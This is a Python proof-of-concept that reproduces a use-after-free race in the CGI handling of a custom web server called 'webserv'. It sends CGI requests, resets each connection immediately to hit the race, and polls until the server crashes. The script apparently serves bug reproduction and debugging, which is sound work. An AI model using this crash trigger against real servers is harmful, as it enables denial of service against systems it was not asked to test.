#!/usr/bin/env python3
"""
BUG 1 — Use-After-Free in _startCgi
=====================================
Sends a CGI request and immediately RSTs the TCP connection so that the
server's epoll_ctl(MOD) call inside _rearmClient operates on a stale fd.

Usage:
    python3 trigger.py [--host 127.0.0.1] [--port 5000] [--rounds 50]

The script repeats the race many times because the kernel RST delivery
timing is non-deterministic. With enough rounds the UAF almost always fires.

Indicator that bug triggered:
  - Server process disappears (check with: ps aux | grep webserv)
  - Or: server stops accepting new connections
  - Or: ASan prints heap-use-after-free
"""

import socket
import struct
import time
import argparse
import sys
import os

def hard_rst_socket(sock):
    """Set SO_LINGER(0) then close — sends RST instead of FIN."""
    l_onoff  = 1
    l_linger = 0
    sock.setsockopt(
        socket.SOL_SOCKET,
        socket.SO_LINGER,
        struct.pack('ii', l_onoff, l_linger)
    )
    sock.close()

def cgi_request(host, port):
    """
    Send a CGI GET request and immediately RST the connection.
    The window between 'server reads request' and 'server calls _rearmClient'
    is the race we are exploiting.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    try:
        s.connect((host, port))
    except ConnectionRefusedError:
        print("[!] Cannot connect — is the server running?")
        sys.exit(1)

    request = (
        "GET /cgi-bin/check_session.py HTTP/1.1\r\n"
        "Host: {host}\r\n"
        "Connection: close\r\n"
        "\r\n"
    ).format(host=host)

    s.sendall(request.encode())

    # Immediately RST — give the kernel the smallest possible window
    # to deliver the RST before the server calls _rearmClient.
    hard_rst_socket(s)

def check_server_alive(host, port):
    """Return True if the server is still accepting connections."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1.0)
    try:
        s.connect((host, port))
        s.close()
        return True
    except Exception:
        return False

def main():
    parser = argparse.ArgumentParser(description="BUG 1 trigger — UAF in _startCgi")
    parser.add_argument("--host",   default="127.0.0.1")
    parser.add_argument("--port",   type=int, default=5000)
    parser.add_argument("--rounds", type=int, default=80,
                        help="Number of race attempts (default 80)")
    args = parser.parse_args()

    print("=" * 60)
    print("BUG 1 — Use-After-Free in _startCgi")
    print("=" * 60)
    print(f"Target : {args.host}:{args.port}")
    print(f"Rounds : {args.rounds}")
    print()

    if not check_server_alive(args.host, args.port):
        print("[!] Server is not responding. Start it first:")
        print("    make re && ./webserv conf/confs/replit.conf")
        sys.exit(1)

    print("[*] Server is up. Starting race attempts...")
    print()

    crashed = False
    for i in range(1, args.rounds + 1):
        cgi_request(args.host, args.port)

        # Every 10 rounds check if the server is still alive
        if i % 10 == 0:
            alive = check_server_alive(args.host, args.port)
            status = "alive" if alive else "DEAD"
            print(f"  Round {i:3d}/{args.rounds} — server: {status}")
            if not alive:
                crashed = True
                break

        # Tiny sleep to let OS process the RST before next attempt
        time.sleep(0.01)

    print()
    if crashed:
        print("[CONFIRMED] Server crashed — UAF bug triggered.")
        print("            Recompile with -fsanitize=address for full trace.")
    else:
        print("[NOT TRIGGERED] Server survived all rounds.")
        print("  The race window is tight. Try:")
        print("  1. Increase --rounds to 200+")
        print("  2. Apply inject_patch.diff for a deterministic trigger")
        print("  3. Run under ASan build to catch the corruption earlier")

if __name__ == "__main__":
    main()
